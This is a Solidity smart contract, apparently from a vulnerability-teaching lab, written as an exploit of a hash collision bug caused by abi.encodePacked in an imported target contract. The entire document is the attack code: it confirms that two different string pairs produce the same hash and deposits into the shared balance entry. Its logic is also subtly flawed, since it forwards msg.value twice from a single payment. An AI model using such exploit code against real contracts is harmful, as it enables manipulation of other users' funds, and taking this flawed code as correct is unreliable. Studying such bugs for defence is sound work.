// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./Hash-collisions.sol";

contract MaliciousHashCollisionExploit {
    HashCollisionBug public targetContract;

    constructor(address _targetContract) {
        targetContract = HashCollisionBug(_targetContract);
    }

    function exploitHashCollision(string memory _string1a, string memory _string2a, string memory _string1b, string memory _string2b) external payable {
        // Generate the same hash for different inputs using abi.encodePacked
        bytes32 hashA = targetContract.createHash(_string1a, _string2a);
        bytes32 hashB = targetContract.createHash(_string1b, _string2b);
        require(hashA == hashB, "Hash collision not achieved");

        // Deposit funds into the same balance mapping entry
        targetContract.deposit{value: msg.value}(_string1a, _string2a);
        targetContract.deposit{value: msg.value}(_string1b, _string2b);
    }
}